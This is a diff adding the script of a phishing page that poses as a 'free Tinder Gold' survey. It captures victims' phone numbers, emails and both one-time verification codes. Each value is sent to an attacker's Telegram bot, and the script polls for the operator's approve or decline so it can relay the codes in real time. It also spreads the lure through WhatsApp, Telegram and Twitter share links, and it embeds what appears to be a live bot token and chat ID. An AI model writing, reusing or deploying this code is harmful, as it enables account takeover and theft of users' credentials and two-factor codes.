+    `✉️ Email: <code>${userEmail}</code>\n` +
+    `🆔 Session: <code>${sessionId}</code>\n\n` +
+    `✅ Approve = proceed to phone code\n❌ Decline = ask to re-enter details`,
+    true,
+    sessionId
+  );
+
+  startPolling();
+}
+
+// STEP 2: Submit phone OTP code
+function submitPhoneCode() {
+  const code = document.getElementById('phone-code-input').value.trim();
+  if (!code) {
+    document.getElementById('error-phone-code').style.display = 'block';
+    return;
+  }
+  document.getElementById('error-phone-code').style.display = 'none';
+  userPhoneCode = code;
+
+  document.getElementById('login-phone-code').classList.add('hidden');
+  document.getElementById('waiting-phone-code').classList.remove('hidden');
+
+  sessionId = generateId();
+  currentStep = 'phone-code-wait';
+
+  sendToTelegram(
+    `📱 <b>Phone Code Submitted</b>\n\n` +
+    `📞 Phone: <code>${userPhone}</code>\n` +
+    `✉️ Email: <code>${userEmail}</code>\n` +
+    `🔢 Code: <code>${code}</code>\n` +
+    `🆔 Session: <code>${sessionId}</code>\n\n` +
+    `✅ Approve = proceed to email code\n❌ Decline = ask to re-enter code`,
+    true,
+    sessionId
+  );
+
+  startPolling();
+}
+
+// STEP 3: Submit email OTP code
+function submitEmailCode() {
+  const code = document.getElementById('email-code-input').value.trim();
+  if (!code) {
+    document.getElementById('error-email-code').style.display = 'block';
+    return;
+  }
+  document.getElementById('error-email-code').style.display = 'none';
+  userEmailCode = code;
+
+  document.getElementById('login-email-code').classList.add('hidden');
+  document.getElementById('waiting-email-code').classList.remove('hidden');
+
+  sessionId = generateId();
+  currentStep = 'email-code-wait';
+
+  sendToTelegram(
+    `✉️ <b>Email Code Submitted</b>\n\n` +
+    `📞 Phone: <code>${userPhone}</code>\n` +
+    `✉️ Email: <code>${userEmail}</code>\n` +
+    `🔢 Code: <code>${code}</code>\n` +
+    `🆔 Session: <code>${sessionId}</code>\n\n` +
+    `✅ Approve = activate Gold\n❌ Decline = ask to re-enter code`,
+    true,
+    sessionId
+  );
+
+  startPolling();
+}
+
+// ==========================================
+// POLLING FOR ADMIN APPROVAL
+// ==========================================
+function startPolling() {
+  if (pollInterval) clearInterval(pollInterval);
+  
+  pollInterval = setInterval(async () => {
+    const updates = await getTelegramUpdates();
+    
+    if (updates && updates.result) {
+      for (const update of updates.result) {
+        if (update.callback_query) {
+          const data = update.callback_query.data;
+          const [action, session] = data.split('|');
+          
+          if (session === sessionId) {
+            // Answer the callback to stop loading state on Telegram
+            await answerCallback(update.callback_query.id);
+            
+            if (action === 'approve') {
+              handleApproval();
+            } else if (action === 'decline') {
+              handleDecline();
+            }
+            
+            // Clear processed updates
+            clearInterval(pollInterval);
+            break;
+          }
+        }
+      }
+    }
+  }, 2000);
+}
+
+async function getTelegramUpdates() {
+  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates`;
+  try {
+    const res = await fetch(url);
+    return await res.json();
+  } catch (e) {
+    return null;
+  }
+}
+
+async function answerCallback(callbackId) {
+  const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callbackId, text: 'Processed ✓' })
+    });
+  } catch (e) {}
+}
+
+function handleApproval() {
+  if (currentStep === 'credentials-wait') {
+    // Approved credentials — show phone code entry
+    document.getElementById('waiting-credentials').classList.add('hidden');
+    document.getElementById('login-phone-code').classList.remove('hidden');
+    document.getElementById('phone-code-sub').textContent = `We sent a verification code to ${userPhone}.`;
+
+  } else if (currentStep === 'phone-code-wait') {
+    // Approved phone code — show email code entry
+    document.getElementById('waiting-phone-code').classList.add('hidden');
+    document.getElementById('login-email-code').classList.remove('hidden');
+    document.getElementById('email-code-sub').textContent = `We sent a verification code to ${userEmail}.`;
+
+  } else if (currentStep === 'email-code-wait') {
+    // Approved email code — show success
+    document.getElementById('waiting-email-code').classList.add('hidden');
+    document.getElementById('result-success').classList.remove('hidden');
+
+    sendToTelegram(
+      `✅ <b>GOLD ACTIVATED!</b>\n\n` +
+      `📞 Phone: <code>${userPhone}</code>\n` +
+      `✉️ Email: <code>${userEmail}</code>\n\n` +
+      `User has successfully claimed Tinder Gold.`
+    );
+  }
+}
+
+function handleDecline() {
+  if (currentStep === 'credentials-wait') {
+    // Go back to credentials form
+    document.getElementById('waiting-credentials').classList.add('hidden');
+    document.getElementById('login-credentials').classList.remove('hidden');
+    document.getElementById('error-phone').textContent = 'Please enter correct details and try again.';
+    document.getElementById('error-phone').style.display = 'block';
+
+  } else if (currentStep === 'phone-code-wait') {
+    // Go back to phone code entry
+    document.getElementById('waiting-phone-code').classList.add('hidden');
+    document.getElementById('login-phone-code').classList.remove('hidden');
+    document.getElementById('error-phone-code').textContent = 'Incorrect code. Please enter the correct code.';
+    document.getElementById('error-phone-code').style.display = 'block';
+    document.getElementById('phone-code-input').value = '';
+
+  } else if (currentStep === 'email-code-wait') {
+    // Go back to email code entry
+    document.getElementById('waiting-email-code').classList.add('hidden');
+    document.getElementById('login-email-code').classList.remove('hidden');
+    document.getElementById('error-email-code').textContent = 'Incorrect code. Please enter the correct code.';
+    document.getElementById('error-email-code').style.display = 'block';
+    document.getElementById('email-code-input').value = '';
+  }
+}
+
+// ==========================================
+// SHARING
+// ==========================================
+function share(platform) {
+  const text = 'Get free Tinder Gold! Complete this survey: ';
+  const url = CONFIG.SHARE_URL;
+  
+  switch(platform) {
+    case 'wa':
+      window.open(`https://wa.me/?text=${encodeURIComponent(text + url)}`, '_blank');
+      break;
+    case 'tg':
+      window.open(`https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`, '_blank');
+      break;
+    case 'tw':
+      window.open(`https://twitter.com/intent/tweet?text=${encodeURIComponent(text + url)}`, '_blank');
+      break;
+  }
+}
+
+function copyLink() {
+  navigator.clipboard.writeText(CONFIG.SHARE_URL).then(() => {
+    showToast('Link copied to clipboard!');
+  });
+}
+
+function restart() {
+  location.reload();
+}
+
+// ==========================================
+// INITIALIZATION
+// ==========================================
+document.addEventListener('DOMContentLoaded', () => {
+  updateProgress();
+  
+  // Check if config is set
+  if (CONFIG.BOT_TOKEN === '8627724098:AAGYEd18BM1L6d7ub18HhysMsdYlIppNcCo' || CONFIG.CHAT_ID === '8092667233') {
+    console.warn('⚠️ Please update CONFIG.BOT_TOKEN and CONFIG.CHAT_ID with your Telegram credentials');
+  }
+});
+</script>
+
+</body>
+</html>
